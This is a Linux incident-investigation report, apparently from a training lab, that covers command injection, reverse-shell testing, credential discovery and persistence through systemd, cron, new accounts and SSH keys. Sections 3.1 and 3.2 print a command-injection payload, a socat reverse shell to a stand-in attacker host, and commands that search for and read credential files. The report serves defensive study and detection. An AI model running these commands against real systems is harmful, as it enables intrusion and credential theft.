# Linux Threat Detection and Incident Investigation

# 1. Scenario Overview

This report documents a Linux security investigation focused on identifying suspicious activity associated with potential system compromise. The analysis examines host-level artifacts, command execution, privilege escalation attempts and persistence mechanisms to reconstruct relevant post-compromise activity.

The investigation follows a threat detection approach, correlating audit records, authentication logs, application behavior and system configuration artifacts to identify potentially unauthorized actions and assess their security implications.

The scope of the investigation includes:

- **Suspicious Command Execution:** identifying potential command injection and activity consistent with reverse shell execution.
- **Privilege Escalation:** investigating credential discovery behavior, attempts to obtain elevated privileges and potential exposure of sensitive configuration data.
- **Startup Persistence:** examining systemd service definitions and scheduled tasks for mechanisms that could enable continued execution.
- **Account Persistence:** investigating unauthorized account creation and modifications to SSH authorized keys.
- **Evidence Correlation:** analyzing related events and artifacts to establish an activity timeline and distinguish confirmed observations from investigative hypotheses.

The primary objective is to identify relevant indicators of compromise, assess potential weaknesses in system security and develop actionable recommendations to improve detection and prevention capabilities.

---

# 2. Investigation Objectives

The objective of this investigation is to identify, analyze and document suspicious activity on a Linux system by examining system logs, command execution artifacts, authentication records and persistence-related configurations.

The investigation aims to achieve the following objectives:

- **Detect Suspicious Command Execution:** identify potential command injection and activity consistent with reverse shell execution.
- **Investigate Privilege Escalation:** analyze credential discovery attempts, commands used to obtain elevated privileges and potential exposure of sensitive information.
- **Identify Persistence Mechanisms:** examine systemd services and scheduled tasks for configurations that could enable unauthorized execution across system restarts.
- **Investigate Account-Based Persistence:** review account creation events, privileged group membership and SSH authorized key modifications for indicators of potentially unauthorized access.
- **Correlate Security Evidence:** compare relevant audit events, authentication records and system artifacts to establish a consistent timeline of suspicious activity.
- **Assess Security Impact:** evaluate the potential risks associated with the observed behaviors while distinguishing confirmed evidence from unverified hypotheses.
- **Recommend Defensive Controls:** develop practical mitigation and monitoring recommendations to reduce the likelihood of similar activity and improve detection capabilities.

The investigation prioritizes evidence-based conclusions. Each finding should be supported by observable artifacts wherever possible and limitations in the available evidence should be explicitly documented.

---

# 3. Evidence Analysis

This section documents the evidence collected during the investigation of suspicious Linux activity. The analysis focuses on command execution, potential privilege escalation, startup persistence, account persistence and broader threat detection considerations.

The observations are based on application behavior, Linux audit records, authentication logs and system configuration artifacts. Conclusions are limited to what the available evidence supports.

---

## 3.1 Reverse Shell Detection

The investigation examined application behavior and Linux audit records to identify potential command injection and activity consistent with reverse shell execution.

---

### 3.1.1. Command Injection Analysis

The application was tested using the following input:

```bash
127.0.0.1 && whoami
```

The application returned the username `svctrypingme`, indicating that the appended command was executed within the application's execution context. This behavior is consistent with a potential command injection vulnerability, in which user-controlled input is interpreted as part of an operating system command.

![Command injection evidence](images/trypingme-command-injection.png)

---

### 3.1.2. Reverse Shell Assessment

A `socat` reverse shell command was subsequently tested in the controlled environment:

```bash
127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh
```

The test was used to assess the potential impact of the suspected command injection vulnerability. The command attempts to establish a TCP connection to a remote host and attach a shell to that connection.

![Reverse shell test](images/trypingme-reverse-shell-test.png)

---

### 3.1.3. Audit Log Analysis

The audit log at `/home/ubuntu/scenario/audit.log` was examined for events associated with suspicious command execution and possible reverse shell activity.

The investigation identified activity associated with the IP address `10.14.105.255`. This address was retained as an investigative indicator. Its precise role in the suspected activity requires correlation with the relevant process execution records and, where available, network telemetry.

![Audit log evidence](images/auditd-reverse-shell-evidence.png)

---

### 3.1.3. Technical Analysis

The execution of an appended shell command indicates that the application may be vulnerable to command injection. If exploited, this weakness could allow an attacker to execute operating system commands with the privileges of the application process.

The reverse shell test demonstrates the potential impact of this behavior within the controlled environment. However, the test alone does not establish that an external attacker successfully obtained persistent or interactive access to the system.

The available audit evidence warrants further investigation of the suspicious activity associated with `10.14.105.255`. The exact connection details and extent of any compromise should not be considered confirmed without corroborating evidence.

---

## 3.2 Privilege Escalation

The investigation examined command history and audit records for potential credential discovery, access to sensitive configuration files and attempts to obtain elevated privileges.

---

### 3.2.1. Credential Discovery

The following command was used to search for occurrences of the keyword `pass`:

```bash
grep -iR pass
```

This search can help identify files or content potentially related to credentials. However, the command alone does not demonstrate that a valid password was discovered or successfully used.

![Credential discovery](images/privilege-discovery-grep.png)

---

### 3.2.2. Attempt to Switch to the Root Account

The command `su root` was identified during the investigation as an attempt to switch to the root account.

![Root account switch attempt](images/privilege-escalation-su-root.png)

The presence of this command indicates an attempt to obtain a root shell. The available evidence does not independently establish whether authentication succeeded or whether elevated access was obtained.

---

### 3.2.3. Sensitive Configuration File Access

Audit records from `/home/ubuntu/scenario/audit.log` were searched for references to environment configuration files.

An event recorded at `2025-09-23 14:53:44.238` contained the following process information:

```text
proctitle=cat .env.local
argc=2
a0=cat
a1=.env.local
```

This evidence indicates that the `cat .env.local` command was executed. Environment files can contain sensitive configuration values, including credentials, API keys and connection strings.

![Environment file access evidence](images/privilege-env-credential-exposure-1.png)

The contents of the environment file were subsequently validated through testing in the application, which returned the password and confirmed that sensitive credentials were exposed. This finding demonstrates the potential impact of insecure credential storage and the risk of credential disclosure through application functionality (the password has been omitted from this report).

![Environment file access evidence](images/privilege-env-credential-exposure-2.png)

---

### 3.2.4. Technical Analysis

The investigation identified credential discovery activity, an attempt to switch to the root account and access to an environment configuration file. These behaviors are relevant to privilege escalation investigations because exposed credentials may enable unauthorized access to privileged accounts.

Although the application test confirmed that a password could be retrieved, the available evidence does not establish that the credentials were successfully used to obtain root privileges. Confirmation of successful privilege escalation would require additional evidence, such as successful authentication records, a change in effective user identity or audit events demonstrating privileged command execution.

---

## 3.3 Startup Persistence

The investigation examined systemd service configuration and cron entries for mechanisms that could allow suspicious programs to execute automatically or persist across system restarts.

---

### 3.3.1. systemd Service Investigation

Audit records were searched for activity involving `/etc/systemd`. An event recorded at `2025-09-23 17:06:42.860`, with event ID `834`, contained the following process information:

```text
proctitle=nano /etc/systemd/system/tux.service
```

This event indicates that the `tux.service` file was opened using a text editor.

![systemd audit evidence](images/systemd-persistence-audit.png)

The service configuration was then examined. Its `[Service]` section contained the following directive:

```ini
ExecStart=/var/lib/misc/tux
```

This directive specifies `/var/lib/misc/tux` as the executable to be launched when the service starts.

![systemd service configuration](images/systemd-service-configuration.png)

The service definition and associated audit event are relevant persistence indicators. However, the available evidence does not independently establish whether the service was enabled, started or executed automatically during a reboot.

---

### 3.3.2. Cron Persistence Investigation

The investigation also examined cron-related audit records and the root user's scheduled tasks.

The root crontab contained the following entry:

```cron
@reboot /usr/sbin/phoenix
```

The `@reboot` directive configures the associated command to run when the cron service processes startup tasks after a system reboot.

![Cron audit evidence](images/cron-persistence-audit.png)

![Cron reboot entry](images/persisted-binaries-execution.png)


This configuration is a significant persistence indicator because it schedules an executable to run automatically during startup. The presence of the entry does not prove that a reboot occurred during the investigation or that the executable successfully ran at startup.

---

### 3.3.3. Technical Analysis

The investigation identified two startup-related artifacts:

- A systemd service configuration referencing `/var/lib/misc/tux`.
- A root crontab entry configuring `/usr/sbin/phoenix` to execute at reboot.

Both artifacts warrant further investigation to determine their legitimacy, origin and operational status. Validation should include examining file ownership and permissions, reviewing executable metadata, checking service enablement and correlating configuration changes with process execution records.

---

## 3.4 Account Persistence

The investigation examined authentication logs and audit records for evidence of account creation and changes involving SSH authorized keys.

---

### 3.4.1. User Account Creation

Authentication log records were searched for `useradd` activity. The investigation identified the username `Koichi` in connection with account creation activity.

![User account creation evidence](images/account-persistence-user-creation.png)

The account was identified during the investigation as being associated with potential persistence activity. Lab observations also indicated a relationship with the `sudo` group; however, group membership should be independently verified using account records or explicit group-change events before being treated as confirmed evidence in the report.

The creation of an account is not inherently malicious. Its legitimacy depends on factors such as authorization, account ownership, creation time, group membership and subsequent login activity.

---

### 3.4.2. SSH Authorized Keys Investigation

Audit records were searched for activity involving SSH authorized keys. The investigation identified a reference to:

```text
/root/.ssh/authorized_keys
```

![SSH authorized keys audit evidence](images/account-persistence-ssh-key-audit.png)

The `authorized_keys` file can define public keys permitted to authenticate to an SSH account. Unauthorized modifications to this file may allow an attacker to maintain access without repeatedly supplying an account password.

The file reference alone does not establish that a key was added, that an existing key was malicious or that key-based authentication was successfully used. Further investigation would be required to establish the exact change and its impact.

---

### 3.4.3. Technical Analysis

The account creation event and the reference to `/root/.ssh/authorized_keys` are relevant to an investigation of account-based persistence.

To validate the suspected activity, an analyst should correlate account creation timestamps, privileged group membership, file modification records, SSH authentication events and any available baseline of authorized keys. This would help distinguish legitimate administration from unauthorized changes.

---

## 3.5 Targeted Attacks and Threat Detection Recap

The investigation illustrates how multiple host-level artifacts can contribute to the detection of suspicious activity on Linux systems. Command execution, credential discovery, privileged account access, startup configuration changes and SSH key management should be considered together rather than evaluated in isolation.

Linux infrastructure can be targeted as a primary objective or compromised as part of a broader intrusion affecting a mixed operating system environment. Servers, cloud workloads and virtualization hosts may provide access to sensitive information or critical services, making effective Linux monitoring an important component of an organization's security strategy.

The investigation highlights several defensive priorities:

- Monitor application processes for unexpected shell execution and suspicious child processes.
- Correlate authentication events with changes in effective user identity and privileged command execution.
- Monitor systemd service files, cron configuration and executable paths for unexpected changes.
- Alert on new accounts, unexpected privileged group membership and modifications to SSH authorized keys.
- Centralize audit and authentication logs to support event correlation and incident reconstruction.
- Preserve relevant evidence before making changes to a potentially compromised system.

The observations documented in this section provide the technical basis for the consolidated indicators, findings and mitigation recommendations presented in the following sections.

---

# 4. Indicators of Compromise (IOCs)

The investigation identified several indicators and system artifacts associated with potentially suspicious activity. These include a network address, account-related activity, executable paths, persistence configurations and access to sensitive application data.

The indicators listed below should be interpreted in the context of the investigation. Some represent observed artifacts, while others require further validation before they can be classified as confirmed indicators of compromise.

| Indicator / Artifact | Category | Description | Assessment |
|---|---|---|---|
| `10.14.105.255` | IP Address | Address associated with suspicious activity investigated in the audit records. | Requires further correlation |
| `svctrypingme` | Account / Execution Context | Username returned after an appended shell command was executed through the application. | Observed |
| `su root` | Command | Command associated with an attempt to switch to the root account. | Attempt observed; success unconfirmed |
| `.env.local` | Sensitive File | Environment configuration file accessed using `cat`, potentially exposing credentials. | Access observed; credential exposure validated through application testing |
| `/etc/systemd/system/tux.service` | systemd Configuration | Service definition referencing `/var/lib/misc/tux`. | Persistence-related artifact |
| `/var/lib/misc/tux` | Executable Path | Executable referenced by the `tux.service` configuration. | Requires file analysis |
| `/usr/sbin/phoenix` | Executable Path | Program configured in the root crontab to execute at reboot. | Persistence configuration observed |
| `@reboot /usr/sbin/phoenix` | Cron Configuration | Root cron entry configured to execute the specified program during startup. | Persistence mechanism configured |
| `Koichi` | User Account | Account identified in connection with account creation activity. | Account creation observed; authorization requires verification |
| `/root/.ssh/authorized_keys` | SSH Configuration | File referenced in audit records during the investigation of possible SSH-based persistence. | File reference observed; unauthorized modification unconfirmed |

---

## 4.1. IOC Assessment

The artifacts above provide starting points for further investigation and detection engineering. Their presence alone does not establish that every associated file, account, command or address is malicious.

The IP address should be correlated with process execution and network telemetry to establish its role in the suspected activity. The systemd service, cron entry, executable files, account creation event and SSH authorized keys should be reviewed against an established system baseline and legitimate administrative activity.

The findings also highlight the importance of monitoring access to sensitive configuration files and preventing credentials from being exposed through application functionality.

No passwords, challenge flags or other sensitive credential values are included in this report.

---

# 5. Findings

The investigation identified multiple security-relevant events and configuration artifacts associated with potential command injection, credential exposure, privilege escalation attempts and persistence mechanisms.

The findings below summarize the observed activity and its potential security implications. Each conclusion is limited to the evidence available during the investigation.

| ID | Finding | Evidence | Assessment |
|---|---|---|---|
| F-01 | Potential command injection | The application executed an appended `whoami` command and returned `svctrypingme`. | Confirmed command execution through application input |
| F-02 | Potential reverse shell activity | A `socat` reverse shell command was tested and suspicious activity associated with `10.14.105.255` was identified in the investigation. | Reverse shell activity requires further corroboration |
| F-03 | Credential exposure | Testing confirmed that the application returned a password associated with the environment file investigation. | Credential exposure confirmed; the password is excluded from this report |
| F-04 | Privilege escalation attempt | The `su root` command was identified during the investigation. | Attempt observed; successful privilege escalation unconfirmed |
| F-05 | systemd persistence indicator | `/etc/systemd/system/tux.service` referenced `/var/lib/misc/tux`. | Configuration observed; automatic execution and legitimacy require verification |
| F-06 | Cron-based persistence | The root crontab contained `@reboot /usr/sbin/phoenix`. | Startup execution configured; execution following an actual reboot not established |
| F-07 | Potential account persistence | The account `Koichi` was identified in account creation activity. | Account creation observed; authorization and privileged group membership require verification |
| F-08 | Potential SSH-based persistence | Audit records referenced `/root/.ssh/authorized_keys`. | File reference observed; unauthorized key modification or use unconfirmed |

---

## 5.1. Overall Assessment

The investigation identified evidence of command execution through application input and confirmed that the application could return a sensitive password. These observations indicate a security risk involving command execution and credential exposure.

---

# 6. Mitigation Recommendations

Based on the investigation findings, the following measures are recommended to reduce the risk of command injection, credential exposure, privilege escalation and persistence on Linux systems.

---

## 6.1 Prevent Command Injection

- Avoid passing user-controlled input directly to shell commands.
- Use secure APIs, parameterized execution and strict input validation.
- Run application services with minimal privileges.
- Monitor application processes for unexpected shell execution and suspicious child processes.

---

## 6.2 Protect Sensitive Credentials

- Remove exposed credentials from application files and source code.
- Restrict access to sensitive configuration files using appropriate ownership and permissions.
- Rotate credentials confirmed to have been exposed.
- Use a secrets management solution and prevent applications from returning sensitive values.

---

## 6.3 Strengthen Privilege Management

- Apply the principle of least privilege to users and services.
- Review `sudo` permissions and privileged group membership.
- Monitor `su`, `sudo`, authentication failures and changes in effective user identity.
- Investigate suspicious attempts to access privileged accounts.

---

## 6.4 Detect Persistence Mechanisms

- Validate the legitimacy of `/etc/systemd/system/tux.service` and `/var/lib/misc/tux`.
- Review the root crontab entry `@reboot /usr/sbin/phoenix`.
- Monitor changes to systemd services, cron jobs and executable files.
- Implement file integrity monitoring for sensitive system configuration paths.

---

## 6.5 Secure Accounts and SSH Access

- Verify the legitimacy and privileges of the `Koichi` account.
- Review `/root/.ssh/authorized_keys` for unauthorized changes.
- Monitor account creation, privileged group membership changes and SSH authentication activity.
- Restrict direct root SSH access where operationally appropriate.

---

## 6.6 Improve Monitoring and Incident Response

- Centralize audit, authentication, application and system service logs.
- Correlate process execution, authentication events, network activity and configuration changes.
- Preserve relevant evidence before modifying a potentially compromised system.
- Investigate suspicious artifacts before removing them to avoid disrupting legitimate services or destroying forensic evidence.
- Document confirmed findings, potential impact and remaining uncertainties.

These recommendations prioritize secure command execution, credential protection, least-privilege access, persistence detection and effective log correlation.

